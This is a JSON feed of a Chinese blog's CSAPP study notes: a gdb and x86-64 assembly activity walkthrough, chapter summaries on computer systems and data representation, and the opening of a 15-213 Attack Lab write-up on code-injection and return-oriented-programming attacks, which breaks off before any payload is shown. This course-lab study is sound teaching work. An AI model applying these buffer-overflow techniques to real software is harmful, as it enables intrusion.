whatIsThis:\n   0x00000000004008a1 &lt;+0&gt;:     mov    (%rdi),%edx\n   0x00000000004008a3 &lt;+2&gt;:     mov    (%rsi),%eax\n   0x00000000004008a5 &lt;+4&gt;:     mov    %edx,(%rsi)\n   0x00000000004008a7 &lt;+6&gt;:     mov    %eax,(%rdi)\n   0x00000000004008a9 &lt;+8&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>其中<code>%rdi</code>是第一个参数，<code>%rsi</code>是第二个参数。设第一个参数为<code>x</code>，第二个参数为<code>y</code>，(本来以为<code>x</code>和<code>y</code>是<code>long</code>类型整数，后来发现有指针，而赋值的变量又是<code>int</code>类型，那么可能<code>x</code>和<code>y</code>是<code>int*</code>类型的指针变量）。那么<code>whatIsThis</code>函数如下：</p>\n<pre><code class=\"c\">// x in %rdi, y in %rsi\nvoid whatIsThis(int* x, int* y) &#123;\n    int edx = *x;\n    int eax = *y;\n    *y = edx;\n    *x = eax;\n&#125;\n</code></pre>\n<p>可以看到，此函数的作用为交换两个变量的位置。输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\nInput two integers to test whatIsThis: &lt;x&gt; &lt;y&gt;\n2 3\nLet&#39;s examine memory before we execute whatIsThis\nPlease type (gdb) x/8d $rsp\n  This will dump the memory (x) containing eight (8) decimal integers ([%]d)\n  starting from the stack pointer ($rsp).\nOnce you&#39;ve examined the memory dump, continue.\n</code></pre>\n<blockquote>\n<p>注意 gdb 中寄存器以<code>$</code>开头，而不是<code>%</code></p>\n</blockquote>\n<p>输入<code>2 3</code>，提示要求我们在执行<code>whatIsThis</code>之前，查看一下当前的内存分布。首先输入<code>x/8d $rsp</code>查看一下<code>%rsp</code>开始处 8 个整数的值。结果如下：</p>\n<pre><code>(gdb) p $rsp\n$1 = (void *) 0x7fffffffde30\n(gdb) x/8d $rsp\n0x7fffffffde30: -8384   32767   2       3\n0x7fffffffde40: 0       0       4196939 0`\n</code></pre>\n<p>输入<code>c</code>，提示再次查看<code>%rsp</code>处的值：</p>\n<pre><code>0x7fffffffde30: -8384   32767   3       2\n0x7fffffffde40: 0       0       4196939 0\n</code></pre>\n<p>可以看到 2 和 3 的位置交换了。Activity 1 完成。</p>\n<h2 id=\"Activity-2\"><a href=\"#Activity-2\" class=\"headerlink\" title=\"Activity 2\"></a>Activity 2</h2><p>输入<code>./act2</code>，提示显示<code>Did whatIsThis(): compare, swap, add, or multiply two numbers? Enter the keyword corresponding to the correct operation. </code>，根据上一问结果，输入<code>swap</code>。因为<code>whatIsThis</code>交换了两个变量的值。提示<code>Correct! Please rerun in gdb with r s.</code></p>\n<p>输入<code>gdb ./act2</code>，再输入<code>r s</code>，提示如下：</p>\n<pre><code>(gdb) r s\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 s\nWe are going to learn about memory access.  First, displacements.\nA displacement is an immediate added to a memory access.\nIt is of the form: D(mem), so that the address accessed is D + mem.\nPlease disassemble viewThis.\nQ.  What are the function&#39;s argument(s)?\nQ.  What is the return register of the function?\nQ.  Which instruction(s) initialize the return register?\nQ.  What does the function do?\nAfter you have your answer, please rerun with r a.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>提示要求我们反汇编<code>viewThis</code>函数，并且回答四个问题。输入<code>disassemble viewThis</code>，显示如下：</p>\n<pre><code>(gdb) disassemble viewThis\nDump of assembler code for function viewThis:\n   0x0000000000400687 &lt;+0&gt;:     mov    0x4(%rdi),%eax\n   0x000000000040068a &lt;+3&gt;:     add    (%rdi),%eax\n   0x000000000040068c &lt;+5&gt;:     add    0x8(%rdi),%eax\n   0x000000000040068f &lt;+8&gt;:     add    0xc(%rdi),%eax\n   0x0000000000400692 &lt;+11&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>四个问题的回答分别是：</p>\n<pre><code>Q1: 函数的参数在M[%rdi + 4],M[%rdi],M[%rdi + 8],M[%rdi + 12]中\nQ2: 函数返回值在%eax中\nQ3: mov    0x4(%rdi),%eax 指令初始化了返回值寄存器%rax\nQ4: 对一个4个int类型的数组求和\n</code></pre>\n<p>根据提示，输入<code>r a</code>，提示信息如下：</p>\n<pre><code>(gdb) r a\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 a\nSince viewThis added 4 numbers from an array, let&#39;s look at more array\naccesses.  The general form of a memory reference is D(B,I,S)\nD + B + I * S\nDisassemble: viewThisNext.\nQ.  What does this function do?\nWe are going to call this function with array: arr.\nPrint its address with: p/x &amp;arr\nThen continue.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>上一题答对啦：<code>viewThis</code>就是累加 4 个 int 类型元素的数组。输入<code>disassemble viewThisNext</code>，显示如下：</p>\n<pre><code>(gdb) disassemble viewThisNext\nDump of assembler code for function viewThisNext:\n   0x0000000000400693 &lt;+0&gt;:     mov    (%rdi,%rsi,4),%eax\n   0x0000000000400696 &lt;+3&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>上述代码的逻辑为：<code>int ret = *(rdi + rsi * 4); 因为汇编代码是从字节出发，而</code>C<code>代码的指针递增，每次加</code>sizeof(T)<code>个字节。这里是</code>4<code>,那么推测</code>sizeof(T) &#x3D; 4<code>，这里的类型应该是 int。那么</code>%rdi<code>应该是数组的起始位置，</code>%rsi<code>等于要取的数字的索引，最后返回到</code>%eax&#96;中。其 C 语言描述如下：</p>\n<pre><code class=\"c\">int get_val(int* arr,long index)\n&#123;\n    return arr[index];\n&#125;\n</code></pre>\n<p>输入<code>p/x &amp;arr</code>，结果如下：</p>\n<pre><code>(gdb) p/x &amp;arr\n$1 = 0x602080\n</code></pre>\n<p>输入<code>x/10d &amp;arr</code>来打印从<code>arr</code>地址开始处后 10 个整数。显示结果如下：</p>\n<pre><code>(gdb) x/10d &amp;arr\n0x602080 &lt;arr&gt;: 0       1       2       3\n0x602090 &lt;arr+16&gt;:      4       5       6       7\n0x6020a0 &lt;arr+32&gt;:      8       9\n</code></pre>\n<p>可以看到 arr 地址开始后存储了 10 个整数，从 0 到 9。输入<code>c</code>继续，提示显示：</p>\n<pre><code>(gdb) c\nContinuing.\nNow we&#39;ll actually call viewThisNext.  Please input a number between 0 and 9.\n5\nYou requested: 0x602094 = 5\n\nNow rerun with r L.\n[Inferior 1 (process 42895) exited normally]\n</code></pre>\n<p>我想要 5，该值在 0x605094 位置处。输入<code>r L</code>。提示如下：</p>\n<pre><code>(gdb) r L\nStarting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/gdb-and-assembly/act2 L\nMany times, the compiler will need to compute the address before it is used.\nThe instruction LEA provides this capability.\nDisassemble: viewThisL.\nIt does the same calculation as before, except it passes along the pointer.\nOnce you&#39;re done looking at the disassembly dump, continue.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入<code>diassemble viewThisL</code>后，提示显示：</p>\n<pre><code>(gdb) disassemble viewThisL\nDump of assembler code for function viewThisL:\n   0x0000000000400697 &lt;+0&gt;:     sub    $0x8,%rsp\n   0x000000000040069b &lt;+4&gt;:     lea    (%rdi,%rsi,4),%rdi\n   0x000000000040069f &lt;+8&gt;:     callq  0x4004e0 &lt;free@plt&gt;\n   0x00000000004006a4 &lt;+13&gt;:    add    $0x8,%rsp\n   0x00000000004006a8 &lt;+17&gt;:    retq\nEnd of assembler dump.\n</code></pre>\n<p>输入<code>c</code>，提示如下：</p>\n<pre><code>(gdb) c\nContinuing.\nLEA can also be used to do actual math.  The function mx mutliplies its\nargument by some value.  Note the use of the SHL instruction to left shift.\nDisassemble: mx.\nQ.  Write down the four parts of LEA&#39;s displacement-mode address.\nQ.  After accounting for the left shift, what value does mx() multiply its argument by?\nFor your final exercise, leave gdb and type head -n 8 act3.c.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n</code></pre>\n<p>输入<code>disassemble mx</code>，显示结果如下：</p>\n<pre><code>(gdb) disassemble mx\nDump of assembler code for function mx:\n   0x00000000004006a9 &lt;+0&gt;:     lea    (%rdi,%rdi,2),%rax\n   0x00000000004006ad &lt;+4&gt;:     shl    $0x2,%rax\n   0x00000000004006b1 &lt;+8&gt;:     retq\nEnd of assembler dump.\n</code></pre>\n<p>LEA 内存地址偏移计算模式为 D(B,I,S)。其中地址 &#x3D; B + I*S + D。这里的指令为<code>lea    (%rdi,%rdi,2),%rax</code>。那么结果为<code>%rax = %rdi + 2 * %rdi = 3 \\_ %rdi</code>。然后左移两位，也就是 * 4。最后<code>%rax</code>的值为<code>12 \\* %rdi</code>。</p>\n<h2 id=\"Activity-3\"><a href=\"#Activity-3\" class=\"headerlink\" title=\"Activity 3\"></a>Activity 3</h2><p>接下来，退出 gdb，并且输入<code>head -n 8 act3.c</code>。显示如下：</p>\n<pre><code>//\n// This quick activity looks at compilation and assembly.\n//   type gcc -Og -S act3.c\n// Then view act3.s in your favorite editor\n//   Notice the assembly is there, plus some other lines.\n// Now compile with gcc -Og -c act3.c\n// Then type objdump -d act3.o\n//\n</code></pre>\n<p>根据提示，输入<code>gcc -Og -S act3.c</code>，然后输入<code>objdump -d act3.o</code>。显示如下：</p>\n<pre><code class=\"asm\">\nact3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;mx&gt;:\n   0:   f3 0f 1e fa             endbr64\n   4:   48 8d 04 7f             lea    (%rdi,%rdi,2),%rax\n   8:   48 c1 e0 02             shl    $0x2,%rax\n   c:   c3                      retq\n\n000000000000000d &lt;addm&gt;:\n   d:   f3 0f 1e fa             endbr64\n  11:   e8 00 00 00 00          callq  16 &lt;addm+0x9&gt;\n  16:   48 83 c0 01             add    $0x1,%rax\n  1a:   c3                      retq\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch3/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch3/",
            "title": "CSAPP Chapter 3 - 程序的机器级表示",
            "date_published": "2024-02-29T03:08:11.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch2/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch2/",
            "title": "CSAPP Chapter 2 - 信息的表示和处理",
            "date_published": "2024-02-29T03:08:01.000Z",
            "content_html": "<h2 id=\"信息的表示和处理\"><a href=\"#信息的表示和处理\" class=\"headerlink\" title=\"信息的表示和处理\"></a>信息的表示和处理</h2><p>信息 &#x3D; 二进制位的组合 + 对位组合的解释：无符号，补码，有符号整数，浮点数。</p>\n<blockquote>\n<p>介绍了一点 C 语言的演变历史：汇编不方便 —&gt; ANSI C -&gt; ISC C90 -&gt; ISO C99 -&gt; ISO C11(可以在编译时通过<code>-std=cxx</code>指定编译所使用的版本)</p>\n</blockquote>\n<p>1 个字节 &#x3D; 8 位 -&gt; 内存中信息的编码以字节为单位 -&gt; 机器级程序将内存看作一个大的数组（虚拟内存）-&gt; 利用指针来存储地址 -&gt; 指针是机器级代码的概念，其组成包含类型+值，但是类型在内存当中是不可见的，在内存中所有东西都是没有感情的字节数组。-&gt; 指针的大小 &#x3D; 字长（总线一次传输数据的最大字节数）-&gt; 虚拟地址空间以字编码 -&gt; 字长：虚拟地址空间的最大大小 -&gt; 32 位机器：4GB 64 位机器：16EB -&gt; <code>32位程序</code> &amp; <code>64位程序</code>指的是：如何编译</p>\n<p>字节的表示方法包括：16 进制，10 进制，2 进制等等。</p>\n<p>字节序：对跨越多个字节的程序对象，我们必须明确：</p>\n<ol>\n<li>地址在哪里：存储的最低字节处</li>\n<li>如何排列他们：大端法 or 小端法？</li>\n</ol>\n<blockquote>\n<p>ASCII 编码与 Unicode 编码。Unicode 和 UTF-8 是什么关系？</p>\n</blockquote>\n<p>布尔代数与位运算，其有分配律，且<code>(a^b)^a = b</code>，位向量掩码，经典的<code>inplace_swap</code>利用异或进行值交换</p>\n<p>逻辑运算，short circuits</p>\n<p>移位运算：</p>\n<ol>\n<li>逻辑右移</li>\n<li>算术右移（有符号数算术右移，无符号数逻辑右移，Java 使用<code>&gt;&gt;&gt;</code>来进行逻辑右移）</li>\n</ol>\n<blockquote>\n<p>注意：</p>\n<ol>\n<li>移动 k 位（k 很大时），移动 k % w 位</li>\n<li>加法和减法的优先级 &gt; 移位运算优先级，如 <code>1&lt;&lt;2+3&lt;&lt;4</code>，因此移位时记得加括号</li>\n</ol>\n</blockquote>\n<h2 id=\"整数的表示和运算\"><a href=\"#整数的表示和运算\" class=\"headerlink\" title=\"整数的表示和运算\"></a>整数的表示和运算</h2><p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch2/numbers.png\" alt=\"numbers.png\"></p>\n<h2 id=\"浮点数的表示\"><a href=\"#浮点数的表示\" class=\"headerlink\" title=\"浮点数的表示\"></a>浮点数的表示</h2><ol>\n<li>单精度浮点数(<code>float</code>)：1 位符号位 + 8 位阶码 + 23 位位数</li>\n<li>双精度浮点数(<code>double</code>)：1 位符号位 + 11 位阶码 + 52 位尾数</li>\n</ol>\n<p>规格化数：</p>\n<h2 id=\"重点习题\"><a href=\"#重点习题\" class=\"headerlink\" title=\"重点习题\"></a>重点习题</h2><ul>\n<li>2 进制，16 进制，10 进制之间的转化</li>\n<li>大端法和小端法对同一个数值的不同存储方式</li>\n<li>整数和浮点数表示的重合部分</li>\n<li>布尔代数和位运算</li>\n<li>位向量掩码</li>\n<li>布尔运算之间的组合（or,and,xor,not）</li>\n<li>逻辑运算</li>\n<li>使用位级运算和逻辑运算实现<code>^</code></li>\n<li>移位运算的计算</li>\n<li>同样位表示的无符号和补码值</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch1/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/CSAPP%20%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/Ch1/",
            "title": "CSAPP Chapter 1 - 计算机系统漫游",
            "date_published": "2024-02-29T03:06:06.000Z",
            "content_html": "<p><code>CSAPP</code>的全称是<code>Computer Systems: A Programmer&#39;s Perspective</code>，中文翻译为<code>《深入理解计算机系统》</code>。这本书以<code>hello world</code>程序的运行贯穿始终，可以作为应用级别程序员一窥底层概貌的显微镜，也可以作为系统方向研究者的研究的方向概览。下面我们从第一章出发，进入计算机系统的世界。</p>\n<h2 id=\"信息-位-上下文\"><a href=\"#信息-位-上下文\" class=\"headerlink\" title=\"信息 &#x3D; 位 + 上下文\"></a>信息 &#x3D; 位 + 上下文</h2><ol>\n<li>计算机系统 &#x3D; 硬件 + 系统软件</li>\n<li>hello 从源程序开始 -&gt; 所有信息都用位表示 -&gt; 8 个位一组 -&gt; 字节 —&gt; ASCII 标准编码字节 —&gt; 文本字符 -&gt; 文本文件</li>\n<li>其他 -&gt; 二进制文件</li>\n<li>数据都是比特位，区别在于上下文如何解释他们</li>\n</ol>\n<blockquote>\n<p>C 语言的起源：作为用于 Unix 操作系统的语言被开发</p>\n</blockquote>\n<h2 id=\"程序与编译系统\"><a href=\"#程序与编译系统\" class=\"headerlink\" title=\"程序与编译系统\"></a>程序与编译系统</h2><p>编译过程：</p>\n<ol>\n<li><code>预处理器(cpp)</code>修改原始 <code>hello.c</code>程序，生成<code>hello.i</code>文件</li>\n<li><code>编译器(ccl)</code>将其翻译为机器语言指令，生成<code>hello.s</code>文件</li>\n<li><code>汇编器(as)</code>将其翻译为二进制目标文件(可重定位目标程序)，生成<code>hello.o</code>文件</li>\n<li><code>链接器(ld)</code>将其与其他预编译好的二进制目标文件链接起来，生成二进制可执行文件，生成<code>hello</code>文件</li>\n</ol>\n<blockquote>\n<p>什么是可重定位目标程序？</p>\n<p>GNU 项目 &amp; 自由软件概念 &amp; 开源运动（环境为 GNU 环境，内核为 Linux 内核）</p>\n</blockquote>\n<p>了解编译器工作过程的好处：</p>\n<ol>\n<li>优化程序性能</li>\n<li>理解链接时出现的错误</li>\n<li>避免安全漏洞</li>\n</ol>\n<h2 id=\"处理器-内存中机器指令\"><a href=\"#处理器-内存中机器指令\" class=\"headerlink\" title=\"处理器 &amp; 内存中机器指令\"></a>处理器 &amp; 内存中机器指令</h2><p>此时<code>hello</code>已经被编译成可执行文件并存储在磁盘上。</p>\n<h3 id=\"硬件组成\"><a href=\"#硬件组成\" class=\"headerlink\" title=\"硬件组成\"></a>硬件组成</h3><ol>\n<li>总线：传输定长字节块，称为字（各系统不一样大）</li>\n<li>I&#x2F;O 设备：键盘、鼠标、显示器、磁盘驱动器等。每个 I&#x2F;O 设备通过一个控制器或适配器与 I&#x2F;O 总线相连。其区别主要在于其封装方式。</li>\n<li>主存：临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据，由一组动态随机存储器（DRAM）芯片构成。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有唯一的地址（数组索引）。</li>\n<li>处理器：是解释或执行存储在主存中引擎的指令。下一条要执行的指令的地址存储在 PC 中。CPU 中还包含一组寄存器。CPU 的设计根据指令集架构而不同。微体系结构描述的就是这个处理器是如何实现的。</li>\n</ol>\n<h3 id=\"hello-程序运行\"><a href=\"#hello-程序运行\" class=\"headerlink\" title=\"hello 程序运行\"></a>hello 程序运行</h3><p>假设我们在<code>shell</code>中输入以下内容：</p>\n<pre><code class=\"bash\">./hello\n</code></pre>\n<p>其运行的过程如下：</p>\n<ol>\n<li>shell 程序将输入字符串<code>./hello</code>逐一读入寄存器（通过 I&#x2F;O 桥和总线接口）</li>\n<li>将其转储到内存中（通过总线接口和 I&#x2F;O 桥）</li>\n<li>shell 程序从磁盘中加载可执行的<code>hello</code>可执行文件，将其从磁盘通过 I&#x2F;O 桥复制到主存（DMA 技术，如果没有 DMA 技术，还需要通过处理器才能到达主存）</li>\n<li>处理器执行<code>hello</code>程序中的指令</li>\n<li><code>hello world</code>字符串：主存 —&gt; I&#x2F;O 桥 -&gt; 总线接口 —&gt; 寄存器文件 -&gt; 总线接口 -&gt; I&#x2F;O 桥 -&gt; 图形适配器 —&gt; 显示器</li>\n</ol>\n<h2 id=\"高速缓存-存储设备层次结构\"><a href=\"#高速缓存-存储设备层次结构\" class=\"headerlink\" title=\"高速缓存 &amp; 存储设备层次结构\"></a>高速缓存 &amp; 存储设备层次结构</h2><p>高速缓存：较大的存储设备运行慢，造价低。而近年来处理器和主存之间的速度差距还在增大。因此，高速缓冲存储器(cache)的目的是尽量减少处理器和主存之间差异带来的速度差距。其采用更小更快的存储设备，作为暂时的存储区域。其使用静态随机访问存储器（SRAM）技术实现。</p>\n<blockquote>\n<p>核心：高速缓存的局部性原理</p>\n</blockquote>\n<p>存储设备层次结构：在处理器和较大较慢的设备之间插入一个更小更快的存储设备，上一层次设备作为第一层存储器的高速缓存。</p>\n<h2 id=\"操作系统资源管理-抽象\"><a href=\"#操作系统资源管理-抽象\" class=\"headerlink\" title=\"操作系统资源管理 &amp; 抽象\"></a>操作系统资源管理 &amp; 抽象</h2><p>操作系统：应用程序和硬件之间插入的一层软件。</p>\n<p>其几个基本功能包括：</p>\n<ol>\n<li>防止硬件被失控的应用程序滥用</li>\n<li>向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备（利用抽象）<ol>\n<li>文件: I&#x2F;O 设备抽象</li>\n<li>虚拟内存：主存 + 磁盘 I&#x2F;O 设备抽象</li>\n<li>进程：对处理器、主存和 I&#x2F;O 设备抽象</li>\n</ol>\n</li>\n</ol>\n<blockquote>\n<p>Unix、POSIX 和标准 Unix 规范：</p>\n<p>时期 1：OS&#x2F;360 + Multics<br>时期 2：Unix（包含层次文件系统、作为用户级进程的 shell 概念）<br>时期 3：Unix 4.xBSD(增加了虚拟内存和 Internet 协议) + System V Unix + Solaris<br>时期 4：IEEE 标准化 Unix 开发，将该标准命名为 POSIX 标准</p>\n</blockquote>\n<h3 id=\"进程-线程\"><a href=\"#进程-线程\" class=\"headerlink\" title=\"进程 &amp; 线程\"></a>进程 &amp; 线程</h3><h4 id=\"进程\"><a href=\"#进程\" class=\"headerlink\" title=\"进程\"></a>进程</h4><p>进程是操作系统对一个正在运行的程序的一种抽象，在这个系统中上可同时运行多个进程，而每个进程都好像在独自的使用硬件。并发运行时，是一个进程的指令与另一个进程的指令时间交错执行的。这是通过处理器在进程间切换实现的，该机制由操作系统实现，称之为上下文切换。上下文是指进程运行所需的所有状态信息，包括 PC、寄存器文件当前值、主存的内容。一般单处理器一次只能执行一个进程的代码，当它需要交错执行多个指令时，需要执行上下文切换，其步骤包括：</p>\n<ol>\n<li>保存当前进程的上下文</li>\n<li>恢复新进程的上下文</li>\n<li>将控制权转移到新进程（系统调用）</li>\n<li>新进程终止后，操作系统恢复旧进程上下文</li>\n<li>控制权转移回旧进程（系统调用）</li>\n</ol>\n<p>控制权的转移通过系统调用实现，它使得 CPU 的状态从用户态变为内核态。操作系统内核是系统管理全部进程所用代码和数据结构的集合。</p>\n<p>在单核处理器中，一个 CPU 可以并发的执行多个进程。而在多核 CPU 中，多个处理器可以同时执行多个进程。</p>\n<h4 id=\"线程\"><a href=\"#线程\" class=\"headerlink\" title=\"线程\"></a>线程</h4><p>一个进程可以由多个称为线程的执行单元组成，每个线程都运行在进程的上下文中，并共享同样的代码和数据区域，但是不一样的是他们拥有各自独立的栈空间。</p>\n<h3 id=\"虚拟内存\"><a href=\"#虚拟内存\" class=\"headerlink\" title=\"虚拟内存\"></a>虚拟内存</h3><p>虚拟内存为每个进程提供了一种假象，就是她们都单独的占有主存，每个进程看到的内存都是一致的，我们将其称之为虚拟地址空间。虚拟地址空间从低字节到高字节可划分为以下几个段：</p>\n<ol>\n<li>只读的程序代码和数据</li>\n<li>可读写的程序数据</li>\n<li>堆（malloc）分配</li>\n<li>共享库内存映射区域</li>\n<li>用户栈</li>\n<li>内核虚拟内存（用户代码不可见）</li>\n</ol>\n<h3 id=\"文件\"><a href=\"#文件\" class=\"headerlink\" title=\"文件\"></a>文件</h3><p>文件可以作为 I&#x2F;O 设备的抽象，I&#x2F;O 设备具有各种不同的特性，但是通过将其抽象为文件，我们可以通过一组统一的接口来访问他们。</p>\n<h2 id=\"网络通信\"><a href=\"#网络通信\" class=\"headerlink\" title=\"网络通信\"></a>网络通信</h2><p>网络也可以视为一个 I&#x2F;O 设备，我们从文件中读写数据的方法很多都可以应用在网络设备的读写上。</p>\n<h2 id=\"重要主题\"><a href=\"#重要主题\" class=\"headerlink\" title=\"重要主题\"></a>重要主题</h2><blockquote>\n<p>系统是软硬件的有机结合体！</p>\n</blockquote>\n<h3 id=\"Amdahl-定律\"><a href=\"#Amdahl-定律\" class=\"headerlink\" title=\"Amdahl 定律\"></a>Amdahl 定律</h3><p>当我们对系统的某个部分进行加速时，其对系统整体的性能的影响取决于该部分的重要性和加速程度。假设系统执行某应用程序所需时间为$T_{old}$，某部分执行时间与该时间的比例为$\\alpha$，而该部分性能提升比例为$k$。即该部分初始所需时间为$\\alpha<em>T_{old}$,现在为$\\frac{\\alpha</em>T_{old}}{k}$，那么总的执行时间应该为：</p>\n<p>$$<br>    T_{new} &#x3D; (1-\\alpha)T_{old}+\\frac{\\alpha*T_{old}}{k}<br>$$</p>\n<p>加速比 S 为</p>\n<p>$$<br>    S &#x3D; \\frac{T_{old}}{T_{new}} &#x3D; \\frac{1}{(1-\\alpha)+\\frac{\\alpha}{k}}<br>$$</p>\n<p>其结论为：要想显著加速整个系统，必须提升全系统中相当大的部分的速度。此外，当 k 趋近于$\\infin$时，最后的加速比等于$\\frac{1}{1-\\alpha}$</p>\n<h3 id=\"并发和并行\"><a href=\"#并发和并行\" class=\"headerlink\" title=\"并发和并行\"></a>并发和并行</h3><p>我们的优化体现在，希望：</p>\n<ol>\n<li>计算机做的更多</li>\n<li>计算机运行更快</li>\n</ol>\n<h4 id=\"线程级并发\"><a href=\"#线程级并发\" class=\"headerlink\" title=\"线程级并发\"></a>线程级并发</h4><ol>\n<li>使用进程：有多个程序执行</li>\n<li>使用线程：一个进程中执行多个控制流</li>\n</ol>\n<h4 id=\"指令级并行\"><a href=\"#指令级并行\" class=\"headerlink\" title=\"指令级并行\"></a>指令级并行</h4><p>处理器同时执行多条指令。</p>\n<ol>\n<li>流水线：可以用来处理一条指令的不同部分，以此达到同时执行多条指令的目的</li>\n<li>达到比一个周期一条指令更快的执行速率，称之为超标量</li>\n</ol>\n<h4 id=\"单指令、多数据并行\"><a href=\"#单指令、多数据并行\" class=\"headerlink\" title=\"单指令、多数据并行\"></a>单指令、多数据并行</h4><p>许多处理器拥有特殊硬件，允许一条指令产生多个可以并行执行的操作，这种方式称为单指令、多数据，即<code>SIMD并行</code>。例如浮点数加法指令。编译器有时会试图抓取 SIMD 并行性特征，也可以使用特殊向量数据类型编写程序。</p>\n<h3 id=\"重点习题\"><a href=\"#重点习题\" class=\"headerlink\" title=\"重点习题\"></a>重点习题</h3><ul>\n<li>Amdahl 定律计算</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "url": "https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/",
            "title": "15213 Lab 3-Attack lab 实验记录",
            "date_published": "2024-02-29T02:36:22.000Z",
            "content_html": "<h2 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2><p>文件夹中的几个重要文件如下：</p>\n<ul>\n<li>cookie.txt: 8 个 16 进制数字的码，用于唯一标记</li>\n<li>ctarget: 准备用于 code injection attack</li>\n<li>farm.c: 用于 return oriented programming attacks</li>\n<li>hex2raw: 用于生成攻击的二进制文件</li>\n<li>README.txt: 介绍了文件夹中文件的内容</li>\n<li>rtarget: 准备用于 return oriented programming attacks</li>\n</ul>\n<p>实验分为 5 个 phase，其中 Phase 1 到 phase 3 是使用 code injection attack，phase 4-5 使用 return oriented programming attack。</p>\n<h2 id=\"Part-I-Code-Injection-Attack\"><a href=\"#Part-I-Code-Injection-Attack\" class=\"headerlink\" title=\"Part I: Code Injection Attack\"></a>Part I: Code Injection Attack</h2><h3 id=\"Phase-1：覆盖返回地址\"><a href=\"#Phase-1：覆盖返回地址\" class=\"headerlink\" title=\"Phase 1：覆盖返回地址\"></a>Phase 1：覆盖返回地址</h3><p>在这个 phase 中，我们需要引导 ctarget 中的<code>test</code>函数返回到<code>touch1</code>函数。首先我们对<code>ctarget</code>做反汇编。其中<code>test</code>函数的汇编代码如下：</p>\n<pre><code>0000000000401968 &lt;test&gt;:\n  401968:\t48 83 ec 08          \tsub    $0x8,%rsp\n  40196c:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401971:\te8 32 fe ff ff       \tcallq  4017a8 &lt;getbuf&gt;\n  401976:\t89 c2                \tmov    %eax,%edx\n  401978:\tbe 88 31 40 00       \tmov    $0x403188,%esi\n  40197d:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  401982:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401987:\te8 64 f4 ff ff       \tcallq  400df0 &lt;__printf_chk@plt&gt;\n  40198c:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401990:\tc3                   